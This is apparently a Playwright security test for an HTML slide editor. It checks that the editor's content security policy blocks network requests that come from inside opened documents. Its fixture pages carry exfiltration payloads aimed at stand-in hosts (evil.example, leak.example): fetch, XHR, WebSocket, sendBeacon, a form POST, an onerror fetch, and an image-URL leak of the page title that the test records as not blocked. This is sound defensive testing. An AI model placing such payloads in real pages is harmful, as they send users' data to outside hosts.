#!/usr/bin/env node
// Network test for the editor (plan 1f). Opens 4 synthetic HTML files in the built editor and records every
// http(s) request. Exit code 0 = all expectations hold.
//   A  fetch / XHR / WebSocket / sendBeacon / form.submit from the document  -> 0 requests (blocked by CSP)
//   B  external image + stylesheet                                            -> loaded (we do not block them)
//   C  new Image().src with data in the URL                                   -> request IS sent (known limit, documented)
//   D  self-contained deck: open, edit, save                                  -> 0 requests, saved file has no CSP line
// Usage: node test-security.mjs [result.json]
import { createRequire } from 'node:module';
import { execSync } from 'node:child_process';
import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const { chromium } = createRequire(execSync('npm root -g', { encoding: 'utf8' }).trim() + '/')('playwright');
const HERE = dirname(fileURLToPath(import.meta.url)), work = mkdtempSync(join(tmpdir(), 'he-sec-'));
execSync('node build-single.mjs', { cwd: HERE, stdio: 'ignore' });
const EDITOR = pathToFileURL(join(HERE, 'public/index.html')).href;
const page = (body, head = '') => `<!doctype html><html><head><meta charset="utf-8"><title>leak-title</title>${head}<style>.slide{width:960px;height:540px;position:relative}</style></head><body><section class="slide"><h1>Test slide</h1><p class="t">Body text</p></section>${body}</body></html>`;
const DOCS = {
  A: page(`<form id="f" action="https://evil.example/form" method="post"><input name="d" value="x"></form><script>
    try{fetch('https://evil.example/fetch?d=1')}catch(e){}
    try{const x=new XMLHttpRequest();x.open('GET','https://evil.example/xhr');x.send()}catch(e){}
    try{new WebSocket('wss://evil.example/ws')}catch(e){}
    try{navigator.sendBeacon('https://evil.example/beacon','d')}catch(e){}
    setTimeout(()=>{try{document.getElementById('f').submit()}catch(e){}},50);
  </script>`),
  B: page('<img src="https://cdn.example/pic.png" alt="">', '<link rel="stylesheet" href="https://cdn.example/style.css">'),
  C: page(`<script>new Image().src='https://leak.example/i?d='+encodeURIComponent(document.title)</script>`),
  D: page('<script>document.body.dataset.ok="1"</script>'),
};
const results = {}, log = {};
const b = await chromium.launch({ headless: true });
async function run(key) {
  const ctx = await b.newContext({ viewport: { width: 1280, height: 900 }, acceptDownloads: true });
  const seen = [];
  await ctx.route(/^(https?|wss?):/, (route) => { seen.push(route.request().url()); route.fulfill({ status: 200, body: route.request().url().endsWith('.css') ? 'h1{color:rgb(1,2,3)}' : '' }); });
  ctx.on('websocket', (ws) => seen.push(ws.url()));
  const p = await ctx.newPage();
  const f = join(work, key + '.html'); writeFileSync(f, DOCS[key]);
  await p.goto(EDITOR); await p.setInputFiles('#openFile', f);
  await p.waitForFunction(() => window.HE.S.doc && window.HE.slides().length > 0); await p.waitForTimeout(800);
  let saved = '';
  if (key === 'D') {
    const box = await p.evaluate(() => { const e = window.HE.S.doc.querySelector('h1'), fr = document.querySelector('#stage').getBoundingClientRect(), r = e.getBoundingClientRect(); return { x: fr.left + r.left + 10, y: fr.top + r.top + r.height / 2 }; });
    await p.mouse.dblclick(box.x, box.y); await p.keyboard.press('End'); await p.keyboard.type(' edited'); await p.keyboard.press('Escape');
    const [d] = await Promise.all([p.waitForEvent('download'), p.click('#bSave')]); const out = join(work, 'D-out.html'); await d.saveAs(out); saved = readFileSync(out, 'utf8');
  }
  await ctx.close();
  log[key] = seen;
  return { seen, saved };
}
const t = (name, ok) => { results[name] = !!ok; console.log(ok ? 'PASS' : 'FAIL', name); };
// Control: the same document opened directly in the browser (no editor) does send those requests.
{
  const ctx = await b.newContext(); const seen = [];
  await ctx.route(/^(https?|wss?):/, (route) => { seen.push(route.request().url()); route.fulfill({ status: 200, body: '' }); });
  ctx.on('websocket', (ws) => seen.push(ws.url()));
  const p = await ctx.newPage(); const f = join(work, 'A0.html'); writeFileSync(f, DOCS.A);
  await p.goto(pathToFileURL(f).href); await p.waitForTimeout(800); await ctx.close();
  t('control: opened directly, the same document sends requests (so A measures the editor)', seen.some((u) => u.includes('/fetch')) && seen.some((u) => u.includes('/beacon')));
}
{ const { seen } = await run('A'); t('A: fetch/XHR/WebSocket/sendBeacon/form from the document are blocked (0 requests)', seen.length === 0); }
{ const { seen } = await run('B'); t('B: external image and stylesheet still load', seen.some((u) => u.endsWith('/pic.png')) && seen.some((u) => u.endsWith('/style.css'))); }
{ const { seen } = await run('C'); t('C: image-URL exfiltration is NOT blocked (known limit, documented in README)', seen.some((u) => u.startsWith('https://leak.example/i?d=leak-title'))); }
{ const { seen, saved } = await run('D'); t('D: self-contained deck edit + save sends 0 requests', seen.length === 0); t('D: saved file has no CSP line and keeps the edit', !/Content-Security-Policy/i.test(saved) && saved.includes('Test slide edited')); }
// E: 「PDF로 저장」 인쇄 문서(계획 _docs/20261105_04 3b)도 문서 속 코드를 돌리지 않는다 — A 재료 + 장 안의 인라인 이벤트(onerror)
{
  const ctx = await b.newContext({ viewport: { width: 1280, height: 900 } }); const seen = [];
  await ctx.route(/^(https?|wss?):/, (route) => { seen.push(route.request().url()); route.fulfill({ status: 200, body: '' }); });
  ctx.on('websocket', (ws) => seen.push(ws.url()));
  const p = await ctx.newPage(); const f = join(work, 'E.html'); writeFileSync(f, DOCS.A.replace('<h1>Test slide</h1>', '<h1>Test slide</h1><img src="data:," alt="" onerror="fetch(\'https://evil.example/onerror\')">'));
  await p.goto(EDITOR); await p.setInputFiles('#openFile', f);
  await p.waitForFunction(() => window.HE.S.doc && window.HE.slides().length > 0); await p.waitForTimeout(800);
  const before = seen.length; const html = await p.evaluate(() => window.HEUI_printDoc());
  const q = await ctx.newPage(); await q.setContent(html); await q.waitForTimeout(800); await q.pdf({ preferCSSPageSize: true }); await ctx.close();
  t('E: PDF print document runs no document code (0 requests from fetch/XHR/WebSocket/beacon/form/onerror)', before === 0 && seen.length === 0 && /script-src 'none'/.test(html));
}
await b.close();
const n = Object.values(results).filter(Boolean).length, all = Object.keys(results).length;
console.log(`total ${n}/${all} pass`); console.log(JSON.stringify(log));
if (process.argv[2]) writeFileSync(process.argv[2], JSON.stringify({ results, requests: log }, null, 1));
process.exit(n === all ? 0 : 1);
